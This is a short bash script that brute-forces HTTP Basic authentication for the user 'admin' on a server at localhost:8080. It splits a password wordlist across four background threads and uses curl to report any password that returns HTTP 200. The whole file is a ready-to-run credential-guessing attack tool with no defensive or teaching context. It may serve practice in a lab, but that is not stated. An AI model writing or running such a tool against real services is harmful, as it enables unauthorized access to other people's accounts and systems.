#!/bin/bash

URL="http://localhost:8080/"
USER="admin"
WORDLIST="passwords.txt"
THREADS=4

# Function for each thread
brute_thread() {
    local start=$1
    local end=$2
    local thread_id=$3
    
    for ((i=start; i<end; i++)); do
        password=$(sed -n "${i}p" "$WORDLIST")
        auth=$(printf "%s:%s" "$USER" "$password" | base64 | tr -d '\n')
        
        response=$(curl -s -o /dev/null -w "%{http_code}" \
                   -H "Authorization: Basic $auth" "$URL" 2>/dev/null)
        
        if [ "$response" = "200" ]; then
            echo "THREAD $thread_id FOUND: $password"
            exit 0
        fi
    done
}

# Main
total=$(wc -l < "$WORDLIST")
chunk=$((total / THREADS))

for ((t=0; t<THREADS; t++)); do
    start=$((t * chunk + 1))
    end=$(( (t + 1) * chunk + 1 ))
    [ $t -eq $((THREADS - 1)) ] && end=$((total + 1))
    
    brute_thread $start $end $t &
done

wait
